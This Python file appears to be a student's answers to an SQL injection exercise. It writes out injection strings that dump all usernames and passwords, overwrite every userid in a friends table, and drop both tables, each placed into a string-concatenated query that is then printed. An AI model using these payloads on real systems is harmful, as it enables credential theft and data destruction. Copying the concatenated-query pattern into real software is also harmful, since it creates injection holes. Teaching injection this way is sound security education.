# 1. Write an attack which will list all the usernames and their passwords.

# Let us assume this is the input from the forms e.g. the login form
uname = "username'; SELECT userid, username, password FROM users WHERE username ='' or ''='' AND password = '' or ''='';--" 
passwd = "put anything here" # it really does not matter what we put here

# Statement in server that we found
sql_statement = "SELECT userid FROM users WHERE username='" + uname + "' AND password='" + passwd + "';" 
print(sql_statement) 

# 2. Write an attack which will update the table so that every entry in 
# the friends table has their userid set to 42.

id = "4; UPDATE friends SET userid = 42 WHERE friendid =11 or ''='';--"

# Compromised query
sql_statement = "SELECT name, phone, age FROM friends WHERE friendid = " + id + ";"
print(sql_statement) 


# 3. Write an attack which will drop both tables.
uname = "username'; DROP TABLE users; --"
paswd = "put anything here "
sql_statement_1 = "SELECT userid FROM users WHERE username='" + uname + "' AND password='" + passwd + "';" 
print(sql_statement_1)

id = "4; DROP TABLE friends; --"
sql_statement_2 = "SELECT name, phone, age FROM friends WHERE friendid = " + id + ";"
print(sql_statement_2) 
